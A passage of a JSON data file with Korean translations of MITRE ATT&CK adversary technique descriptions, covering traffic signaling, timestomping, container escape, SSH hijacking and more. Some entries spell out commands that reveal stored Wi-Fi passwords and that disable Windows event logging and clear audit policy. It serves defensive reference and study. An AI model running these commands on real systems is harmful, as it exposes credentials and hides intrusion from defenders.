수행될 수 있습니다. 첫 번째 방법은 libpcap 라이브러리를 사용하여 해당 패킷을 스니핑하는 것입니다. 또 다른 방법은 원시 소켓을 활용하여 악성 코드가 다른 프로그램에서 이미 사용 중인 포트를 사용할 수 있도록 합니다.\n\n네트워크 장치에서는 공격자가 제작한 패킷을 사용하여 기기가 제공하는 표준 서비스에 대한 네트워크 장치 인증을 활성화할 수 있습니다. 이러한 신호는 telnet과 같은 닫힌 서비스 포트를 열거나 장치의 악성 코드 모듈 수정 트리거, 즉 악의적인 기능의 추가, 제거 또는 변경에 사용될 수 있습니다. 공격자는 하나 이상의 포트(열려 있거나 닫혀 있거나)에 연결을 시도하기 위해 제작된 패킷을 사용할 수 있지만, 목표 달성을 위해 동일한 포트에서 라우터 인터페이스, 브로드캐스트 및 네트워크 주소 IP에 연결을 시도할 수도 있습니다. 임베디드 장치에서 이 트래픽 신호를 활성화하려면, 공격자는 먼저 아키텍처의 단일적인 특성으로 인해 시스템 이미지를 패치해야 합니다.\n\n공격자는 또한 Wake-on-LAN 기능을 사용하여 전원이 꺼진 시스템을 켤 수 있습니다. Wake-on-LAN은 전원이 꺼진 시스템을 깨어나게 하거나 켤 수 있게 해주는 하드웨어 기능으로, 매직 패킷을 전송하여 이루어집니다. 시스템의 전원이 켜지면 측면 이동의 대상이 될 수 있습니다.",
    "external_id": "T1205",
    "modified": "2022-10-19T23:08:40.603Z",
    "translated": true
  },
  {
    "title": "Direct Cloud VM Connections",
    "description": "적대 세력은 유효 계정을 활용하여 클라우드 네이티브 방법을 통해 접근 가능한 클라우드 호스팅 컴퓨팅 인프라에 직접 로그인할 수 있습니다. 많은 클라우드 제공자는 Azure Serial Console, AWS EC2 Instance Connect, AWS System Manager와 같은 클라우드 API를 통해 접근할 수 있는 가상 인프라에 대한 상호작용 연결을 제공합니다. \n\n이러한 연결을 위한 인증 방법에는 암호, 애플리케이션 접근 토큰 또는 SSH 키가 포함될 수 있습니다. 이러한 클라우드 네이티브 방법은 기본적으로 SYSTEM 또는 루트 수준의 접근 권한을 통해 호스트에서 특권 접근을 허용할 수 있습니다.\n\n적대 세력은 이러한 클라우드 네이티브 방법을 활용하여 가상 인프라에 직접 접근하고 환경을 통해 전환할 수 있습니다. 이러한 연결은 일반적으로 스크립트 실행이 아닌 VM에 대한 직접 콘솔 접근을 제공합니다.",
    "external_id": "T1021.008",
    "modified": "2023-10-27T18:32:11.219Z",
    "translated": true
  },
  {
    "title": "System Binary Proxy Execution",
    "description": "적대자는 서명된 또는 다른 방식으로 신뢰되는 이진파일의 실행을 프록시하여 프로세스 및/또는 서명 기반 방어를 우회할 수 있습니다. 이 기술에 사용되는 이진파일은 종종 Microsoft에서 서명된 파일로, 이는 해당 파일들이 Microsoft에서 다운로드되었거나 이미 운영 체제에 내장되어 있다는 것을 나타냅니다. 신뢰할 수 있는 디지털 인증서로 서명된 이진파일은 일반적으로 디지털 서명 검증으로 보호된 Windows 시스템에서 실행될 수 있습니다. Windows 설치의 기본값으로 있는 여러 Microsoft 서명 이진파일은 다른 파일이나 명령의 실행을 프록시하는 데 사용될 수 있습니다.\n\n유사하게, Linux 시스템에서 적대자는 신뢰할 수 있는 이진파일인 <code>split</code>을 악성 명령의 실행을 프록시하는 데 악용할 수 있습니다.",
    "external_id": "T1218",
    "modified": "2024-03-01T16:25:43.150Z",
    "translated": true
  },
  {
    "title": "Timestomp",
    "description": "적대자들은 파일의 시간 속성을 수정하여 새로운 파일이나 기존 파일의 변화를 숨길 수 있습니다. 타임스톰핑은 파일의 타임스탬프(변경, 접근, 생성 및 변경 시간)를 수정하는 기법으로, 종종 동일한 폴더에 있는 파일을 모방하여 악성 파일을 정상 파일과 섞이도록 합니다.\n\n`$STANDARD_INFORMATION`(`$SI`) 및 `$FILE_NAME`(`$FN`) 속성은 마스터 파일 테이블(MFT) 파일에 시간을 기록합니다. `$SI`(날짜/시간 스탬프)는 최종 사용자에게 표시되며 파일 시스템 뷰에도 포함되지만, `$FN`은 커널에 의해 처리됩니다.\n\n`$SI` 속성을 수정하는 것은 사용자 수준에서 API 호출을 사용하여 수정할 수 있기 때문에 가장 일반적인 타임스톰핑 방법입니다. 그러나 `$FN` 타임스톰핑은 일반적으로 시스템 커널과 상호작용하거나 파일을 이동하거나 이름을 바꾸어야 합니다.\n\n적대자들은 파일에 대한 타임스탬프를 수정하여 포렌식 조사관이나 파일 분석 도구에 눈에 띄지 않도록 합니다. `$SI`와 `$FN` 속성 간의 불일치를 식별하는 데 의존하는 탐지를 피하기 위해, 적대자들은 두 속성의 시간을 동시에 수정하는 “이중 타임스톰핑”을 수행할 수 있습니다.\n\n타임스톰핑은 악성 소프트웨어와 도구를 숨기기 위해 파일 이름 변조와 함께 사용될 수 있습니다.",
    "external_id": "T1070.006",
    "modified": "2024-09-30T15:14:56.021Z",
    "translated": true
  },
  {
    "title": "Reflective Code Loading",
    "description": "적대자들은 악성 페이로드의 실행을 숨기기 위해 프로세스에 코드를 반사적으로 로드할 수 있습니다. 반사적 로딩은 디스크의 파일 경로를 기반으로 하는 스레드나 프로세스를 생성하는 대신에 페이로드를 프로세스의 메모리 내에서 직접 할당하고 실행하는 것입니다.\n\n반사적으로 로드된 페이로드는 컴파일된 바이너리 파일일 수도 있고, 익명 파일(오직 RAM에만 존재하는)일 수도 있으며, 파일 없는 실행 코드의 조각(예: 위치 독립적인 쉘코드)일 수도 있습니다. 예를 들어, PowerShell에서 실행되는 `Assembly.Load()` 메서드는 실행 중인 프로세스에 원시 코드를 로드하는 데 악용될 수 있습니다.\n\n반사적 코드 주입은 프로세스 주입과 매우 유사하지만, \"주입\"이 별도의 프로세스의 메모리가 아니라 프로세스의 자체 메모리에 코드를 로드한다는 점이 다릅니다. 반사적 로딩은 임의의 코드 실행이 합법적이거나 그렇지 않은 정상 프로세스 내에서 가려질 수 있기 때문에 프로세스 기반 탐지를 회피할 수 있습니다. 메모리 내에서 페이로드를 반사적으로 로드하면 디스크에 파일이나 기타 유물을 생성하는 것을 피할 수 있을 뿐만 아니라, 악성 소프트웨어가 실행될 때까지 이러한 페이로드를 암호화(또는 기타 방법으로 난독화)하여 유지할 수 있습니다.",
    "external_id": "T1620",
    "modified": "2024-02-09T18:49:08.428Z",
    "translated": true
  },
  {
    "title": "Wi-Fi Discovery",
    "description": "적대자는 손상된 시스템에서 네트워크 이름 및 비밀번호와 같은 Wi-Fi 네트워크에 대한 정보를 검색할 수 있습니다. 그들은 현재 및 미래의 캠페인을 지원하기 위해 Wi-Fi 정보를 계정 탐색, 원격 시스템 탐색, 기타 탐색 또는 자격 증명 액세스 활동의 일부로 사용할 수 있습니다.\n\n적대자는 호스트에서 Wi-Fi 네트워크에 대한 다양한 종류의 정보를 수집할 수 있습니다. 예를 들어, Windows에서는 `netsh wlan show profiles` 명령을 통해 기기가 이전에 연결했던 모든 Wi-Fi 네트워크의 이름과 비밀번호를 확인할 수 있으며, `netsh wlan show profile \"Wi-Fi 이름\" key=clear` 명령을 사용하여 해당 Wi-Fi 네트워크의 비밀번호를 표시할 수 있습니다. 또한, `wlanAPI.dll`의 네이티브 API 함수를 호출하여 로컬에서 접근 가능한 Wi-Fi 네트워크의 이름 및 기타 세부 정보를 발견할 수 있습니다.\n\nLinux에서는 기기가 이전에 연결했던 모든 Wi-Fi 네트워크의 이름과 비밀번호가 `/etc/NetworkManager/system-connections/` 디렉터리의 파일에 저장되어 있을 수 있습니다. macOS에서는 `security find-generic-password -wa wifiname` 명령을 사용하여 알려진 Wi-Fi의 비밀번호를 확인할 수 있으며, 이는 관리자의 사용자 이름 및 비밀번호를 요구합니다.",
    "external_id": "T1016.002",
    "modified": "2023-10-05T11:35:30.887Z",
    "translated": true
  },
  {
    "title": "Ignore Process Interrupts",
    "description": "적대자는 프로세스 중단 신호에서 숨는 명령을 실행함으로써 방어 메커니즘을 회피할 수 있습니다. 많은 운영 체제는 신호를 사용하여 프로세스의 행동을 제어하기 위한 메시지를 전달합니다. 명령 해석기는 종종 사용자가 활성 세션에서 로그오프할 때와 같이 오류 및 기타 중단을 무시하는 특정 명령/플래그를 포함합니다. 이러한 중단 신호는 방어 도구 및/또는 분석가가 지정된 실행 중인 프로세스를 일시 중지하거나 종료하는 데 사용할 수도 있습니다.\n\n적대자는 `nohup`, PowerShell의 `-ErrorAction SilentlyContinue` 또는 중단에 면역이 될 수 있는 유사한 명령을 사용하여 프로세스를 호출할 수 있습니다. 이는 악의적인 명령 및 맬웨어가 사용자가 로그오프하거나 C2 네트워크 연결이 종료되는 등의 시스템 이벤트를 통해 실행을 계속할 수 있게 할 수 있습니다.\n\n프로세스 중단 신호에서 숨는 것은 맬웨어가 계속 실행되도록 할 수 있지만, Trap과는 달리 이는 실제로 종료된 후 프로세스가 다시 호출되지 않기 때문에 지속성을 확립하지 않습니다.",
    "external_id": "T1564.011",
    "modified": "2023-11-06T20:14:51.609Z",
    "translated": true
  },
  {
    "title": "Escape to Host",
    "description": "적대자는 컨테이너에서 탈출하여 기본 호스트에 접근할 수 있습니다. 이는 적대자가 호스트 수준에서 다른 컨테이너화된 리소스에 접근하거나 호스트 자체에 접근할 수 있게 할 수 있습니다. 원칙적으로 컨테이너화된 리소스는 애플리케이션 기능의 명확한 분리를 제공하고 호스트 환경으로부터 격리되어야 합니다.\n\n적대자가 호스트 환경으로 탈출할 수 있는 방법은 여러 가지가 있습니다. 예를 들어, bind 매개변수를 사용하여 호스트의 파일 시스템을 마운트하도록 구성된 컨테이너를 생성하는 것은 적대자가 페이로드를 드롭하고 호스트에서 cron과 같은 제어 유틸리티를 실행할 수 있게 합니다; 특권이 부여된 컨테이너를 사용하여 명령어를 실행하거나 기본 호스트에 악성 커널 모듈을 로드하는 경우; 또는 `unshare`와 `keyctl`과 같은 시스템 호출을 악용하여 권한을 상승시키고 비밀 정보를 훔치는 경우 등이 있습니다.\n\n또한, 적대자는 마운트된 컨테이너 관리 소켓, 예를 들어 `docker.sock`를 활용하여 컨테이너에서 탈출할 수 있습니다. 적대자는 또한 권한 상승을 위한 악용을 통해 탈출할 수 있으며, 이는 호스트 머신의 루트 디렉토리에 접근하기 위해 전역 심볼릭 링크의 취약점을 악용하는 것입니다.\n\n호스트에 접근하게 되면 적대자는 지속성을 확보하거나, 환경 내에서 수평 이동을 하거나, 호스트에서 실행되고 있는 다른 컨테이너에 접근하거나, 호스트에서 명령 및 제어 채널을 설정하는 등의 후속 목표를 달성할 수 있는 기회를 가질 수 있습니다.",
    "external_id": "T1611",
    "modified": "2024-04-19T12:42:18.632Z",
    "translated": true
  },
  {
    "title": "Shortcut Modification",
    "description": "적대자는 시스템 부팅이나 사용자 로그인 중에 프로그램을 실행할 수 있는 바로가기를 생성하거나 수정할 수 있습니다. 바로가기는 클릭되거나 시스템 시작 프로세스에 의해 실행될 때 열리거나 실행될 다른 파일이나 프로그램을 참조하는 데 사용됩니다.\n\n적대자는 시작 폴더에 있는 바로가기를 악용하여 자신의 도구를 실행하고 지속성을 확보할 수 있습니다. 감염 체인에서 페이로드로 자주 사용되지만, 적대자는 새로운 바로가기를 생성하여 간접적인 수단으로 사용할 수 있으며, 악성 바로가기를 합법적인 프로그램처럼 보이도록 하기 위해 변장 기법을 악용할 수 있습니다. 또한 적대자는 대상 경로를 편집하거나 기존의 바로가기를 완전히 교체하여 그들의 악성 소프트웨어가 의도된 합법적인 프로그램 대신 실행되도록 할 수 있습니다.\n\n바로가기는 다른 방법을 구현하여 지속성을 확립하는 데도 악용될 수 있습니다. 예를 들어, LNK 브라우저 확장 프로그램이 수정되어 지속적으로 악성 소프트웨어를 실행할 수 있습니다.",
    "external_id": "T1547.009",
    "modified": "2024-10-15T13:41:16.110Z",
    "translated": true
  },
  {
    "title": "Application Window Discovery",
    "description": "적대자는 열린 애플리케이션 창 목록을 얻으려고 시도할 수 있습니다. 창 목록은 시스템이 어떻게 사용되는지에 대한 정보를 전달할 수 있습니다. 애플리케이션 창에 대한 정보는 수집할 수 있는 잠재적인 데이터를 식별하는 데 사용될 수 있으며, 보안 도구를 식별하여 회피하는 데에도 사용될 수 있습니다.\n\n적대자는 일반적으로 이러한 종류의 열거를 위해 시스템 기능을 악용합니다. 예를 들어, 그들은 명령 및 스크립트 인터프리터 명령과 네이티브 API 함수를 통해 원래 시스템 기능을 통해 정보를 수집할 수 있습니다.",
    "external_id": "T1010",
    "modified": "2024-10-15T16:22:56.372Z",
    "translated": true
  },
  {
    "title": "Email Account",
    "description": "적대자는 이메일 주소와 계정 목록을 얻으려고 시도할 수 있습니다. 그들은 전 세계 주소 목록(GAL)과 같은 Exchange 주소 목록을 덤프하려고 할 수 있습니다.\n\n온프레미스 Exchange와 Exchange Online에서는 <code>Get-GlobalAddressList</code> PowerShell cmdlet을 사용하여 인증된 세션을 통해 도메인의 이메일 주소와 계정을 얻을 수 있습니다.\n\nGoogle Workspace에서는 GAL이 Google Workspace Sync for Microsoft Outlook(GWSMO) 서비스를 통해 Microsoft Outlook 사용자와 공유됩니다. 또한 Google Workspace 디렉토리를 통해 사용자는 조직 내 다른 사용자 목록을 확인할 수 있습니다.",
    "external_id": "T1087.003",
    "modified": "2024-10-17T20:35:35.125Z",
    "translated": true
  },
  {
    "title": "Time Based Evasion",
    "description": "적대자는 가상화 및 분석 환경을 감지하고 피하기 위해 다양한 시간 기반 방법을 사용할 수 있습니다. 여기에는 가동 시간이나 시스템 시계와 같은 시간 기반 속성을 열거하는 것, 타이머 또는 기타 트리거를 사용하여 자동화되거나 제한된 시간 동안만 작동하는 가상 머신 환경(VME) 또는 샌드박스를 회피하는 것이 포함됩니다.\n\n적대자는 초기 실행 시 악성코드 기능을 지연시키기 위해 프로그래밍 방식의 수면 명령이나 기본 시스템 예약 기능을 사용하는 것과 같은 다양한 시간 기반 회피 전략을 사용할 수 있습니다. 지연은 특정 피해자 조건이 충족될 때까지 기다리거나 분석 및 검토를 피하기 위해 예정된 다단계 채널을 사용하는 것에 기반할 수도 있습니다. \n\n무해한 명령이나 다른 작업도 악성코드 실행을 지연시키는 데 사용될 수 있습니다. 루프 또는 불필요한 명령 반복(예: 핑 등)은 악성코드 실행을 지연시키고 자동화된 분석 환경의 시간 한계를 초과할 수 있습니다. 또 다른 변형인 API 해머링은 실행을 지연시키기 위해 다양한 기본 API 함수 호출을 수행하는 것으로, 동시에 분석 환경을 쓸모없는 데이터로 과부하하는 가능성도 있습니다.\n\n적대자는 또한 시간을 메트릭으로 사용하여 샌드박스 및 분석 환경을 감지할 수 있으며, 특히 시간이 경과한 것처럼 시간을 조작하려고 시도하는 환경을 감지할 수 있습니다. 예를 들어, 적대자는 수면 기능 실행 전후의 환경 타임스탬프에 대한 예상 값을 샘플링하고 계산하여 시간이 가속화된 샌드박스를 식별할 수 있습니다.",
    "external_id": "T1497.003",
    "modified": "2024-09-12T15:50:18.048Z",
    "translated": true
  },
  {
    "title": "CMSTP",
    "description": "적대자는 CMSTP를 악용하여 악성 코드를 프록시 실행할 수 있습니다. Microsoft 연결 관리자 프로필 설치 프로그램(CMSTP.exe)은 연결 관리자 서비스 프로필을 설치하는 데 사용되는 명령줄 프로그램입니다. CMSTP.exe는 설치 정보 파일(INF)을 매개변수로 받아 원격 액세스 연결을 위해 활용되는 서비스 프로필을 설치합니다.\n\n적대자는 CMSTP.exe에 악성 명령이 포함된 INF 파일을 공급할 수 있습니다. CMSTP.exe는 DLL과 원격 서버에서 COM 스크립틀렛(SCT)을 로드하고 실행하는 데도 악용될 수 있습니다. 이 실행은 CMSTP.exe가 Microsoft에 의해 서명된 합법적인 이진 파일이기 때문에 AppLocker 및 다른 애플리케이션 제어 방어를 우회할 수 있습니다.\n\nCMSTP.exe는 또한 사용자 계정 제어를 우회하고 악성 INF로부터 임의의 명령을 자동 Elevation된 COM 인터페이스를 통해 실행하는 데 악용될 수 있습니다.",
    "external_id": "T1218.003",
    "modified": "2024-09-12T19:35:43.077Z",
    "translated": true
  },
  {
    "title": "SSH Hijacking",
    "description": "적대자들은 합법적인 사용자의 SSH 세션을 탈취하여 환경 내에서 수평 이동할 수 있습니다. 보안 셸(SSH)은 리눅스 및 macOS 시스템에서 원격 접근을 위한 표준 수단입니다. 이는 사용자가 암호화된 터널을 통해 다른 시스템에 연결할 수 있게 하며, 일반적으로 비밀번호, 인증서 또는 비대칭 암호화 키 쌍을 통해 인증합니다.\n\n손상된 호스트에서 수평 이동하기 위해, 적대자들은 활성 SSH 세션에서 공개 키 인증을 통해 다른 시스템과 설정된 신뢰 관계를 이용하여 기존의 연결을 탈취할 수 있습니다. 이는 SSH 에이전트 자체를 손상시키거나 에이전트의 소켓에 접근함으로써 발생할 수 있습니다. 만약 적대자가 루트 접근 권한을 획득할 수 있다면, SSH 세션을 탈취하는 것이 의심할 여지 없이 간단할 것입니다.\n\nSSH 세션 탈취는 새로운 세션을 생성하는 것이 아니라 기존의 SSH 세션을 탈취하기 때문에 SSH 사용과 다릅니다.",
    "external_id": "T1563.001",
    "modified": "2020-03-23T23:11:24.682Z",
    "translated": true
  },
  {
    "title": "Disable Windows Event Logging",
    "description": "적대자는 탐지 및 감사에 활용될 수 있는 데이터를 제한하기 위해 Windows 이벤트 로그를 비활성화할 수 있습니다. Windows 이벤트 로그는 로그인 시도, 프로세스 생성 등의 사용자 및 시스템 활동을 기록합니다. 이 데이터는 보안 도구 및 분석가가 탐지를 생성하는 데 사용됩니다.\n\nEventLog 서비스는 다양한 시스템 구성 요소 및 애플리케이션의 이벤트 로그를 유지 관리합니다. 기본적으로 이 서비스는 시스템이 켜질 때 자동으로 시작됩니다. 로컬 보안 정책(secpol.msc)에 의해 유지되는 감사 정책은 EventLog 서비스가 기록하는 시스템 이벤트를 정의합니다. 보안 감사 정책 설정은 secpol.msc를 실행한 후 기본 감사 정책 설정을 위한 <code>보안 설정\\로컬 정책\\감사 정책</code> 또는 고급 감사 정책 설정을 위한 <code>보안 설정\\고급 감사 정책 구성</code>으로 이동하여 변경할 수 있습니다. <code>auditpol.exe</code>도 감사 정책을 설정하는 데 사용될 수 있습니다.\n\n적대자는 시스템 전체 로깅이나 특정 애플리케이션의 로깅을 타겟으로 할 수 있습니다. 예를 들어, Windows EventLog 서비스는 <code>Set-Service -Name EventLog -Status Stopped</code> 또는 <code>sc config eventlog start=disabled</code> 명령을 사용하여 비활성화할 수 있으며, 이후 <code>Stop-Service -Name EventLog</code>를 사용하여 서비스를 수동으로 중지할 수 있습니다. 또한, 시스템을 재부팅하여 변경 사항이 적용되도록 하기 위해 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>의 “Start” 값을 수정하여 서비스를 비활성화할 수 있습니다.\n\n레지스트리 키 수정을 통해 EventLog 서비스를 비활성화하는 방법은 여러 가지가 있습니다. 첫째, 관리자 권한 없이도 적대자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>의 \"Start\" 값을 수정한 후 시스템을 재부팅하여 보안 EventLog를 비활성화할 수 있습니다. 둘째, 관리자 권한이 있는 경우, 적대자는 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> 및 <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code>에서 동일한 값을 수정하여 전체 EventLog를 비활성화할 수 있습니다.\n\n또한, 적대자는 명령 프롬프트에서 <code>auditpol</code> 및 그 하위 명령을 사용하여 감사를 비활성화하거나 감사 정책을 지울 수 있습니다. 특정 설정이나 감사 범주를 활성화하거나 비활성화하려면 <code>/success</code> 또는 <code>/failure</code> 매개변수를 사용할 수 있습니다. 예를 들어, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>는 계정 로그인 카테고리에 대한 감사를 종료합니다. 감사 정책을 지우기 위해 적대자는 다음 명령을 실행할 수 있습니다: <code>auditpol /clear /y</code> 또는 <code>auditpol /remove /allusers</code>.\n\nWindows 이벤트 로깅을 비활성화함으로써, 적대자는 침해의 증거를 최소화하며 작동할 수 있습니다.",
    "external_id": "T1562.002",
    "modified": "2023-09-18T22:33:57.556Z",
    "translated": true
  },
  {
    "title": "Scheduled Transfer",
    "description": "적대자는 데이터 유출을 특정 시간대나 특정 간격에 수행하도록 계획할 수 있습니다. 이는 정상적인 활동이나 가용성과의 트래픽 패턴을 혼합하기 위해 이루어질 수 있습니다.\n\n일정에 따라 유출이 이루어질 경우, 네트워크에서 정보를 전송하기 위해 다른 유출 기술도 적용될 수 있습니다.",
    "external_id": "T1029",
    "modified": "2020-03-28T00:26:48.769Z",
    "translated": true
  },
  {
    "title": "SMB/Windows Admin Shares",
    "description": "적대자는 유효한 계정을 사용하여 서버 메시 블록(SMB)을 통해 원격 네트워크 공유와 상호작용할 수 있습니다. 적대자는 이후 로그인한 사용자의 권한으로 행동을 수행할 수 있습니다.\n\nSMB는 동일한 네트워크 또는 도메인 내의 Windows 기기에서 파일, 프린터 및 직렬 포트를 공유하기 위한 프로토콜입니다. 적대자는 SMB를 사용하여 파일 공유와 상호작용함으로써 네트워크 내에서 수평으로 이동할 수 있습니다. 리눅스와 macOS의 SMB 구현은 일반적으로 Samba를 사용합니다.\n\nWindows 시스템에는 관리자가 아닌 사람은 접근할 수 없는 숨겨진 네트워크 공유가 있으며, 이를 통해 원격 파일 복사 및 기타 관리 기능을 수행할 수 있습니다. 예로는 `C$`, `ADMIN$`, `IPC$` 등이 있습니다. 적대자는 이 기술을 관리자 수준의 유효한 계정과 함께 사용하여 SMB를 통해 네트워크 시스템에 원격으로 접근하고, 원격 프로시저 호출(RPC)을 사용하여 시스템과 상호작용하며, 파일을 전송하고 원격 실행을 통해 전송된 바이너리를 실행할 수 있습니다. SMB/RPC를 통한 인증 세션에 의존하는 실행 기술의 예로는 예약 작업/잡, 서비스 실행 및 Windows 관리 도구가 있습니다. 또한 적대자는 NTLM 해시를 사용하여 패스 더 해시 기술을 이용해 관리자 공유에 접근할 수 있으며, 특정 구성 및 패치 수준에서 이를 수행할 수 있습니다.",
    "external_id": "T1021.002",
    "modified": "2023-07-28T17:34:51.250Z",
    "translated": true
  },
  {
    "title": "Implant Internal Image",
    "description": "적대자들은 환경에 접근한 후 지속성을 확보하기 위해 클라우드나 컨테이너 이미지를 악성 코드로 주입할 수 있습니다. 아마존 웹 서비스(AWS) 아마존 머신 이미지(AMI), 구글 클라우드 플랫폼(GCP) 이미지, 그리고 Azure 이미지뿐만 아니라 도커와 같은 인기 있는 컨테이너 런타임도 주입될 수 있습니다. 이 기법은 적대자들이 피해자의 환경 내 레지스트리에 이미지를 주입하는 데 초점을 맞추고 있습니다. 인프라가 어떻게 프로비저닝되는지에 따라 인프라 프로비저닝 도구가 항상 최신 이미지를 사용하도록 지시될 경우 지속적인 접근이 가능할 수 있습니다.\n\n클라우드 컨테이너 이미지에 백도어를 심는 데 도움을 주기 위해 도구가 개발되었습니다. 적대자가 손상된 AWS 인스턴스에 접근할 수 있고 사용 가능한 컨테이너 이미지를 나열할 수 있는 권한을 가진 경우, 웹 셸과 같은 백도어를 주입할 수 있습니다.",
    "external_id": "T1525",
    "modified": "2022-03-08T21:27:49.094Z",
    "translated": true
  },
  {
    "title": "Protocol Tunneling",
    "description": "위협 행위자는 탐지를 피하거나 접근할 수 없는 시스템에 대한 접근을 가능하게 하기 위해 피해 시스템과의 네트워크 통신을 별도의 프로토콜로 터널링할 수 있습니다. 터널링은 한 프로토콜을 다른 프로토콜 내에 명시적으로 캡슐화하는 과정을 포함합니다. 이러한 행동은 기존 트래픽에 섞여 악성 트래픽을 숨기고, 외부 암호화 레이어를 제공할 수 있습니다. 터널링은 또한 네트워크 장치에 의해 필터링되거나 인터넷을 통해 라우팅되지 않을 패킷(SMB, RDP 등의 트래픽)의 라우팅을 가능하게 할 수 있습니다.\n\n다양한 방법으로 한 프로토콜을 다른 프로토콜 내에 캡슐화할 수 있습니다. 예를 들어, 위협 행위자는 SSH 터널링(SSH 포트 포워딩이라고도 함)을 수행하여 암호화된 SSH 터널을 통해 임의의 데이터를 포워딩할 수 있습니다.\n\n위협 행위자는 또한 동적 해상도 과정에서 프로토콜 터널링을 악용할 수 있습니다. C2 인프라를 해석하기 위한 쿼리는 암호화된 HTTPS 패킷 내에 캡슐화될 수 있습니다.\n\n위협 행위자는 또한 프로토콜 터널링을 프록시 및 프로토콜 가장과 결합하여 C2 통신과 인프라를 더욱 숨길 수 있습니다.",
    "external_id": "T1572",
    "modified": "2020-03-27T17:15:35.372Z",
    "translated": true
  },
  {
    "title": "Control Panel",
    "description": "공격자는 control.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. Windows 제어판 프로세스 바이너리(control.exe)는 사용자가 컴퓨터 설정을 보고 조정할 수 있게 해주는 유틸리티인 제어판 항목의 실행을 처리합니다.\n\n제어판 항목은 실행 파일(.exe) 또는 제어판(.cpl) 파일로 등록되며, 후자는 실제로는 <code>CPlApplet</code> 함수를 내보내는 이름 변경된 동적 링크 라이브러리(.dll) 파일입니다. 사용 편의를 위해 제어판 항목은 일반적으로 등록되고 제어판에 로드된 후 사용자에게 제공되는 그래픽 메뉴를 포함합니다. 제어판 항목은 명령줄에서 직접 실행하거나 응용 프로그램 프로그래밍 인터페이스(API) 호출을 통해 프로그래밍 방식으로 실행하거나 파일을 더블 클릭하여 실행할 수 있습니다.\n\n악성 제어판 항목은 피싱 캠페인을 통해 전파되거나 다단계 악성코드의 일부로 실행될 수 있습니다. 제어판 항목, 특히 CPL 파일은 애플리케이션 및/또는 파일 확장자 허용 목록을 우회할 수도 있습니다.\n\n공격자는 또한 악성 DLL 파일(.dll)의 이름을 제어판 파일 확장자(.cpl)로 변경하고 이를 <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>에 등록할 수 있습니다. 이러한 등록된 DLL이 CPL 파일 사양을 준수하지 않거나 <code>CPlApplet</code> 함수를 내보내지 않더라도, 제어판이 실행될 때 <code>DllEntryPoint</code>를 통해 로드되고 실행됩니다. <code>CPlApplet</code>을 내보내지 않는 CPL 파일은 직접 실행할 수 없습니다.",
    "external_id": "T1218.002",
    "modified": "2022-03-11T19:01:55.821Z",
    "translated": true
  },
  {
    "title": "Network Address Translation Traversal",
    "description": "적대자는 네트워크 장치의 네트워크 주소 변환(NAT) 구성을 변경하여 네트워크 경계를 연결할 수 있습니다. NAT에 대한 악의적인 수정은 적대자가 신뢰된 네트워크와 신뢰되지 않은 네트워크를 분리하는 트래픽 라우팅의 제한을 우회할 수 있게 만듭니다.\n\n여러 네트워크를 연결하는 라우터와 방화벽과 같은 네트워크 장치는 네트워크 간의 패킷 전송 과정에서 NAT를 구현할 수 있습니다. NAT를 수행할 때, 네트워크 장치는 IP 주소 헤더의 출발지 주소 또는 목적지 주소를 다시 작성합니다. 일부 네트워크 설계에서는 패킷이 경계 장치를 통과하기 위해 NAT가 필요합니다. 이러한 경우의 일반적인 예는 내부 네트워크가 비인터넷 라우팅 주소를 사용하는 환경입니다.\n\n적대자가 네트워크 경계 장치의 제어를 확보하면, 그들은 기존의 NAT 구성을 활용하여 두 개의 분리된 네트워크 간에 트래픽을 전송하거나 자신만의 디자인에 따른 NAT 구성을 구현할 수 있습니다. NAT가 기능하는 데 필요한 네트워크 설계의 경우, 이는 적대자가 일반적으로 보호된 시스템에 접근하는 것을 방지하는 고유한 라우팅 제한을 극복할 수 있게 합니다. NAT가 필요하지 않은 네트워크 설계의 경우, 주소 변환은 적대자가 자신의 활동을 숨기는 데 사용할 수 있으며, 네트워크 경계 장치를 통과하는 패킷의 주소를 변경하는 것은 방어자에게 데이터 전송 모니터링을 더 어렵게 만들 수 있습니다.\n\n적대자는 네트워크 장치의 운영 체제를 변경하기 위해 자가의 사용자 정의 NAT 메커니즘을 구현하여 자신의 활동을 더욱 숨기기 위해 다중 시스템 이미지를 사용할 수 있습니다.",
    "external_id": "T1599.001",
    "modified": "2020-10-21T01:45:58.951Z",
    "translated": true
  },
  {
    "title": "Upload Tool",
    "description": "적대자들은 타겟팅 중에 접근할 수 있도록 도구를 제3자 또는 적대자가 통제하는 인프라에 업로드할 수 있습니다. 이 도구들은 오픈 소스일 수도 있고, 닫힌 소스일 수도 있으며, 무료이거나 상업적일 수 있습니다. 도구는 적대자에 의해 악의적인 목적으로 사용될 수 있지만(악성코드와는 달리) 이러한 목적을 위해 의도된 것은 아닙니다. 적대자들은 작동을 지원하기 위해 도구를 업로드할 수 있으며, 예를 들어 도구를 피해자 네트워크에 제공하여 인터넷에 접근할 수 있는 웹 서버에 배치해 침입 도구 전송을 가능하게 할 수 있습니다.\n\n도구는 적대자가 이전에 구매하거나 임대한 인프라에 배치되거나 그들이 다른 방식으로 손상시킨 인프라에 배치될 수 있습니다. 도구는 또한 적대자가 제어하는 GitHub 레포지토리와 같은 웹 서비스나 사용자가 애플리케이션을 쉽게 프로비저닝할 수 있도록 하는 서비스 플랫폼에 배치될 수 있습니다.\n\n적대자들은 피해자 기계가 도구를 제삼자 호스팅 위치에서 직접 다운로드하도록 함으로써 도구를 업로드할 필요성을 피할 수 있습니다.",
    "external_id": "T1608.002",
    "modified": "2022-10-20T20:16:32.599Z",
    "translated": true
  },
  {
    "title": "Security Support Provider",
